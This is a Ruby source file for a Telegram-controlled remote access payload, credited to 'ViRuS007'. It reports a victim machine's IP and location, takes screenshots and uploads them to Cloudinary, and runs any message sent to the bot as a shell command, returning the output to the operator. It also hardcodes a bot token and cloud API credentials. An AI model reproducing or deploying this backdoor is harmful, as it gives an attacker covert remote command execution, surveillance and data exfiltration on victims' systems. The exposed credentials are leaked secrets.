#!/usr/bin/ruby

#   Coded by ViRuS007

require "telegram/bot"
require "cloudinary"
require "json"

$TOKEN = "304212840:AAHTNXoYw97LbyPbQL1F-su5mQKek7_neJo" 

Telegram::Bot::Client.run($TOKEN, logger: Logger.new($stdout)) do |bot|
    begin
        bot.listen do |message|
            #bot.api.send_message(chat_id: message.chat.id, text: "Bot Has running...")
            case message.text
            when '/start'
                bot.api.send_message(chat_id: message.chat.id, text: "Hello, #{message.from.first_name}\n\n[+] Bot and payload is Online\n\nEnter /help to see commands!")
            
            #Help command
            when '/help'
                help = """Help:
    /info => To Get ip and system info
    /screenShot => Get ScreenShot of system
    
for run shell command just send without `/` and \nRecive result.

Coded By : ViRuS007
Email : virus007@protonmail.com
Telegram ID : @Msf_Payload

Github: http://github.com/shayanzare/sia-payload
                """
                bot.api.send_message(chat_id: message.chat.id, text: "#{help}")

            #Get info of system
            when '/info'
                host = Socket.gethostname
                res = Net::HTTP.get(URI("http://ipinfo.io/json"))
                resf = res.to_s
                parsed = JSON.parse(resf)

                bot.api.send_message(chat_id: message.chat.id, text: "[*] IP Adress : #{parsed["ip"]} \n[*] Host Name : #{parsed["hostname"]} \n
[*] City : #{parsed["city"]} \n[*] Region : #{parsed["region"]} \n
[*] Country : #{parsed["country"]} \n[*] Locations : #{parsed["loc"]} \n
[*] Org : #{parsed["org"]}")

            #Take screenshot with terminal (import) and cmd
            when "/screenShot"
                #check operatations system
                if RUBY_PLATFORM =~ /win32/
                    #windows platform

                else
                    #linux platform
                    bot.api.send_message(chat_id: message.chat.id, text: "[!] Taking Screenshot and Uploading...\nPlease wait...")
                    #get screenshot with shell linux
                    res = %x{import -window root -resize 1360x768 -delay 200 screenshot.png}
                    #setting Cloudinary api
                    auth = {
                        cloud_name: "dnno5u4ug",
                        api_key:    "577794173378992",
                        api_secret: "5MFNU2rcqMWg69lCHJDcxX15I_Y"
                    }
                    #sneding photo for upload
                    s = Cloudinary::Uploader.upload("screenshot.png", auth)
                    #send result to telegram bot
                    bot.api.send_message(chat_id: message.chat.id, text: "[+] File Succesful Uploaded!\nURLs : \n#{s}")
                end
            
            #Get other command
            else
                command = message.text
                result = %x{#{command}}
                bot.api.sendMessage(chat_id: message.chat.id, text: "[+] Result :\n\n#{result}")
        end
    end
    rescue Telegram::Bot::Exceptions::ResponseError => e
        retry
    end
end